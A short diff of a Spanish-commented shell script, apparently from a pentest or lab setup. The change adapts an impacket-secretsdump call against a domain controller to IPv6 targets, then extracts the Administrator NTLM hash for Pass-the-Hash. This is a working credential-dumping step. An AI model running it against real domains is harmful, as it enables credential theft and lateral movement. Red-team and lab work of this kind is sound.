@@ -60,7 +60,10 @@ fi
 NTHASH=""
 if command -v impacket-secretsdump &>/dev/null; then
   echo "[+] Capturando hash NTLM del DC (secretsdump) para Pass-the-Hash..."
-  OUT="$(impacket-secretsdump "${DOMAIN_ADMIN%/*}/Administrator:${DOMAIN_ADMIN_PASS}@${DC_IP}" 2>/dev/null || true)"
+  # Dual-stack: con DC IPv6, Impacket requiere -target-ip + nombre del DC.
+  SD_TIP=(); SD_HOST="${DC_IP}"
+  case "$DC_IP" in *:*) SD_TIP=(-target-ip "$DC_IP"); SD_HOST="dc-empresa";; esac
+  OUT="$(impacket-secretsdump "${SD_TIP[@]}" "${DOMAIN_ADMIN%/*}/Administrator:${DOMAIN_ADMIN_PASS}@${SD_HOST}" 2>/dev/null || true)"
   NTHASH="$(echo "$OUT" | grep -m1 '^Administrator:500:' | cut -d: -f4)"
 fi
 
